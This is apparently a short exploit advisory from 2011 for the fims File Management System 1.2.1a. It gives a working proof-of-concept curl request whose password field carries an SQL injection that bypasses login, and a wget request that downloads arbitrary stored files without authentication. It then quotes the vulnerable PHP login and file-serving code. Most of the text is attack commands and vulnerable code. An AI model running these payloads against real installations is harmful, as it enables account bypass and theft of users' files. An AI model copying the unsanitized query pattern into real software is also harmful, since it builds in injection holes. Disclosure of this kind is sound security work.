@@ -1,0 +1,39 @@
+# Exploit Title: fims - File Management System <= 1.2.1a SQL Injection and  Vulnerability
+# Date: 2011-10-19
+# Author: Skraps (jackie.craig.sparks(at)live.com jackie.craig.sparks(at)gmail.com @skraps_foo)
+# Software Link: http://fims.codeplex.com/
+# Version: 1.2.1a (tested)
+
+
+---------------
+PoC (POST or GET data)
+---------------
+curl --data "l=help@juno.com&password=word') or id=ABS('1" http://127.0.0.1/fims/?p=1
+ 
+wget "http://127.0.0.1/fims/index.php?f={anyfile number}"
+
+---------------
+Vulnerable code
+---------------
+Line 18 of index.php:
+  if (login($g_db, $_REQUEST[email], $_REQUEST[password]))
+Line 117 of functions.php:
+        function login($db, $email, $password)
+        {
+                $rs = $db->execute("select * from fims_user where email='$email' and password=md5('$password')");
+                if ($db->numrows($rs)>0) return true;
+                else return false;
+        }
+
+Line 51 of index.php:
+                if (isset($_REQUEST[f]))
+                {
+                        assert(is_numeric($_REQUEST[f]));
+                        $file = get_file_data($g_db, $_REQUEST[f]);
+                        header("Accept-Ranges: bytes");
+                        header("Content-Length: ".filesize("files/".$file[id]));
+                        header("Content-Type: {$file[mime]}");
+                        header("Content-Disposition: inline; filename=\"{$file['label']}\";");
+                        readfile("files/".$file[id]);
+                }
+
